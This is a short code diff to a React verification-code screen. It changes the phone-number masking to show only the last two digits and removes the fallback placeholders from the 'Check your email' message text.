@@ -28,16 +28,16 @@ const Verify = () => {
 
     // Format số điện thoại chỉ hiển thị 2 số cuối
     const formatPhoneForDisplay = (phone) => {
-        if (!phone) return '';
+        if (!phone) return '******';
         const cleanPhone = phone.replace(/^\+\d+\s*/, '');
-        if (cleanPhone.length <= 2) return phone;
+        if (cleanPhone.length <= 2) return '******';
         return '*'.repeat(cleanPhone.length - 2) + cleanPhone.slice(-2);
     };
 
     const defaultTexts = useMemo(
         () => ({
             title: 'Check your email',
-            description: `We have sent a verification code to your ${userInfo.email || 'email'} and ${formatPhoneForDisplay(userInfo.phone) || 'phone'}. Please enter the code we just sent to continue.`,
+            description: `We have sent a verification code to your ${userInfo.email} and ${formatPhoneForDisplay(userInfo.phone)}. Please enter the code we just sent to continue.`,
             placeholder: 'Enter your code',
             infoTitle: 'Approve from another device or Enter your verification code',
             infoDescription:
